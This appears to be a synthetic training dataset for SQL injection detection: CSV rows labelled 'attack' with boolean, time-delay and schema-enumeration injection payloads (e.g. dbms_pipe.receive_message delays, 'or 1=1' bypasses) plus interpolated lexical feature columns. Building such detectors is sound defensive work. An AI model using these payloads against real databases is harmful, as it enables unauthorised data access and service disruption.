id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000079,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,1.1025288659127472,155.30807121703157,30.39099406524737,3.987884347874531,77.73695845673159,8.39099406524737,49.96210682554736,19.21801186950526,0.5021033788766759,0.05422696286753913,0.31999058415189097,0.12367907410389403,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.436023739010524,0.0,0.0,2.390994065247369,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000080,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000112,1.449789130280725,126.25364904126981,32.2536490412698,3.534983795574224,35.49270191746039,13.134122603174514,56.373175479365095,21.253649041269806,0.2812566347158612,0.10388843055018054,0.44656308280744933,0.16829185192650895,5.626824520634903,0.0,0.0,1.0,0.0,1.6268245206349028,0.0,10.373175479365097,1.6268245206349026,0.0,1.0,2.626824520634903,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3731754793650973,0.0,0.0,0.0,1.0,0.6268245206349027,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000081,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.43804249682633056,76.37106321592526,19.628936784074742,2.986985691191338,9.31446839203737,13.314468392037371,38.742126431850515,15.0,0.12234763073779953,0.17475585227361426,0.506365686229281,0.19653083075930514,0.0,4.0,0.10482279734579025,-1.3877787807814457e-17,0.0,2.0,0.0,5.7903544053084195,2.0,0.10482279734579025,1.0,2.1048227973457903,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8951772026542097,0.10482279734579025,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.10796609082857861,145.39690475457556,30.030154762271223,4.0396923312268305,84.60798809047412,8.0,37.78891666410144,15.0,0.581867218801386,0.05505679288776884,0.2598445016462785,0.10323148666456657,0.9698452377287778,0.030154762271222157,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.969845237728778,0.03015476227122227,0.0,2.0,4.0,0.9698452377287781,0.030154762271222157,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000083,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000098,0.8582039650015006,70.11095431799552,23.74063621199701,3.5500468660904927,14.110954317995517,16.0,28.0,12.0,0.20092863160381416,0.2283061052560531,0.39953568419809293,0.1712295789420398,4.0,0.0,1.0,-1.3877787807814457e-17,0.6296818940014949,2.0,0.0,4.0,0.0,0.0,0.3703181059985051,3.6296818940014948,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000084,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",nearest_attack_euclidean,R000124,0.7398057587492564,123.39421475357943,30.80289262321028,4.300206315031701,78.42314098568225,4.788429507158874,26.182644260738314,14.0,0.6357404332326869,0.03872520132463246,0.21207218700691555,0.11346217843576506,0.0,2.605785246420562,0.39421475357943736,-1.3877787807814457e-17,1.0,1.0,0.0,2.394214753579437,0.0,0.0,2.8028926232102815,2.3942147535794374,0.0,1.0,0.1971073767897187,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000085,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,1.3361229685715288,142.5313932748039,35.57611812115888,3.99764158099567,59.95527515364502,18.880590605794374,47.84776375768225,15.847763757682252,0.4098371697230738,0.13712338420198217,0.34078127703473693,0.11225816904020708,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.576118121158874,0.0,0.5761181211588746,1.4238818788411254,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000071,1.1153211071504958,121.92441276592935,30.0,3.719775485346426,45.77165957441699,11.653542553197877,45.76850212767491,18.730708510639573,0.3668264657561746,0.09750084771450976,0.3808626949824932,0.1548099915468224,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.922834042558302,2.0,0.7307085106395753,1.2692914893604246,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000087,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000133,1.6568198574367616,148.487798567452,35.297559713490394,3.953942947176067,44.56828921209859,23.675610071627403,53.621949641863,26.621949641862997,0.29919567583257123,0.16024297794089043,0.3615437021229805,0.1790176441035579,0.9731697851177971,0.6756100716274009,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.324389928372598,0.0,2.0,1.0,10.648779856745197,0.324389928372599,0.6756100716274009,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.324389928372599,0.0,1.0,0.0,0.32438992837259906,0.6756100716274009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3243899283725993
SMOTE_000088,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,1.568557066049047,81.8662695400667,20.211694624717655,2.9404827659018307,13.59610179176078,10.615592832956871,43.23118566591374,14.423389249435308,0.16834490736538044,0.1286047879146616,0.5286504555566467,0.17439984916331125,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.807796416478436,0.8077964164784359,0.403898208239218,0.40389820823921807,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000089,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000130,0.6388227667349082,132.22185294768417,28.38907352615792,3.2401940757978758,35.62913726357888,13.0,66.0,17.59271568410528,0.26911873746629367,0.09835158587396811,0.4993234359755304,0.13320624068420775,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,1.5927156841052785,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000090,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000024,0.440341610925863,147.32849987745902,31.632849987745903,3.844077430588062,47.0,16.0,57.062799901967225,27.265699975491806,0.31936313492834645,0.1087193650819903,0.38686641268843686,0.18505108730122632,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.265699975491806,0.0,2.0,1.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000091,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000094,3.9383394827575064,121.6009481796488,31.800474089824398,3.617863473150419,40.401422269473194,12.001185224560999,51.399051820351204,17.799288865263403,0.3319445323595517,0.09839601781927633,0.42305349226617994,0.14660595755499198,4.199525910175601,0.0,0.0,1.0,0.0,1.0,0.0,9.599762955087801,0.5997629550878005,0.0,1.0,2.0,1.0,0.0,0.0,0.40023704491219964,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5997629550878004,0.0,0.0,0.0,0.5997629550878004,0.4002370449121996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5997629550878003
SMOTE_000092,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000089,0.434768082386942,79.35213065563573,27.6338068123635,3.906082628419851,18.90142043709049,24.0,25.6338068123635,10.816903406181748,0.23730666020089422,0.3030776516228981,0.3232481060965216,0.13636758207968597,0.0,0.8169034061817488,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.8169034061817491,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000093,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000070,1.9926694652197248,131.26411850092603,29.526209055452664,4.03617950451532,79.26411850092603,4.052418110905329,32.36895472273668,15.578627166357993,0.6033889626012131,0.031168162782558267,0.2462328447637666,0.11921002985246194,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.473790944547336,0.0,2.631045277263321,3.0524181109053283,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000094,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,1.1347594356437254,132.67925924105637,34.0,3.8364074134950057,37.98510720864345,17.216491219447754,51.47766081296517,26.0,0.28656256009711284,0.1285353947424249,0.38824285831243216,0.1966591868480301,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.2462768021608617,0.0,11.0,0.7537231978391384,2.0,1.0,9.246276802160862,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.24627680216086162,0.0,0.7537231978391384,0.24627680216086156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2462768021608615
SMOTE_000095,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,0.7913322930965959,133.25703191523934,34.25703191523934,3.7921375321498494,45.38085992936612,14.876171985873222,53.87617198587322,19.123828014126776,0.34043911861205983,0.1116226426876412,0.40435677021245847,0.1435814684878405,1.752343971746446,3.8761719858732233,0.0,0.8761719858732231,0.0,1.0,0.0,10.123828014126776,0.12382801412677688,0.12382801412677713,1.2476560282535536,1.8761719858732229,0.8761719858732233,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.876171985873223,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1238280141267769,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.13729594439966772,75.0638973765391,23.075992669752793,3.610582172844694,21.0,13.0,28.91191203703351,12.151985339505586,0.28035291079433033,0.17355180192029973,0.3841665178435788,0.1619287694417912,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.151985339505586,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,1.28964518363024,133.25294052574117,28.747059474258844,4.025611694657799,65.25294052574115,10.0,36.0,22.0,0.48968690134386705,0.07504604392001954,0.2701657581120704,0.165101296624043,2.9882378970353805,1.0117621029646193,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,0.7470594742588451,0.2529405257411549,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2529405257411548,0.747059474258845,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000098,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.261851002079821,68.09030101956853,23.558528425775926,3.3997332772154647,24.88294314844815,4.4414715742240745,28.7658862968963,10.0,0.3656461709785225,0.06502872825775444,0.42208215422433965,0.1472429465393835,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.4414715742240753,0.0,2.0,0.0,0.0,0.0,6.441471574224075,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.4414715742240751,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.441471574224075
SMOTE_000099,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000098,1.5059669917402403,78.76572007541145,26.551170936513255,3.565813780124579,16.1072745694491,16.0,33.32675640476988,13.33168910119247,0.2023327893472908,0.20699927994798803,0.42078452457677995,0.16988340612794123,4.0,0.0,1.0,-1.3877787807814457e-17,0.556103632935843,2.0,0.0,4.887792734128314,0.0,0.443896367064157,0.4438963670641569,3.556103632935843,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,1.4193610513329595,61.76035915154559,24.338742969590427,3.6904067075940423,10.859461272681614,14.859461272681612,23.04143660618237,13.0,0.17624325470076274,0.2410256027085217,0.372188511565499,0.21054263102521653,0.0,4.0,0.6198204242272038,-1.3877787807814457e-17,0.0,2.0,0.0,2.7603591515455927,2.0,0.6198204242272037,1.0,2.6198204242272034,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3801795757727962,0.6198204242272036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000101,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000008,0.999371686322204,113.57465054490557,28.514930108981112,4.1342767965025065,68.8805591281511,5.574650544905564,27.1194408718489,12.0,0.607548351463705,0.048622418363606784,0.23812060999086673,0.10570862018182148,1.9701397820377742,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.029860217962226,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,0.9206683392776615,158.9410357903539,30.0,3.8252899719318303,72.88207158070784,10.117928419292156,57.0,18.941035790353922,0.4583555195767913,0.06391587583188756,0.35866830769029756,0.1190602969010236,2.941035790353923,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,8.0,0.0,0.0,2.0,3.0,0.7352589475884806,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000103,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.960919442462821,69.41301348862237,22.712557054291374,3.3737035608741777,26.0,4.712557054291375,28.98789938003962,9.712557054291374,0.3759395170405243,0.06773347452951214,0.4162974729311198,0.14002953549884375,0.0,0.5748858914172508,2.0,-1.3877787807814457e-17,1.0,2.7125570542913744,0.0,1.7125570542913744,0.0,0.0,0.0,6.42511410858275,0.0,0.2874429457086254,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000099,0.33222327521766115,146.02712446648766,32.7081373399463,4.06410682984018,71.09728755335124,8.902712446648767,46.4162746798926,19.610849786595068,0.48713319594925303,0.06094913399170662,0.3177376000804058,0.13418006997863458,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.902712446648767,0.9027124466487668,0.0,2.902712446648767,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.09728755335123329,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,1.8604229151837615,140.64623955288442,35.48779288857464,3.9170180760139806,42.57922333215489,17.975585777149277,52.60363755500562,27.48779288857464,0.3009370043913533,0.12640728135521995,0.37620339647938356,0.19645231777404315,1.7438964442873188,0.0,2.0,-1.3877787807814457e-17,0.0,1.3719482221436594,0.0,11.0,0.6280517778563406,2.0,1.0,10.115844666430977,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.37194822214365936,0.0,0.3719482221436595,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7438964442873188
SMOTE_000106,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,1.0969416995494563,119.68160867104021,27.489317136997634,4.055947712940129,73.0,3.0,30.149560082033112,13.532048589007095,0.6130519824756522,0.0251939170880405,0.2490093024825275,0.11274479795377992,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.5320485890070956,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000038,0.7609339808346796,76.20414985801385,27.802766572009237,3.916595673922251,21.8050720486836,16.0,26.399077809330258,12.0,0.2838900080276827,0.21046703869784064,0.34779267425109617,0.1578502790233805,4.0,0.0,1.0,-1.3877787807814457e-17,0.19953890466512741,1.1995389046651275,0.0,4.0,0.0,0.8004610953348725,0.8004610953348725,2.399077809330255,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
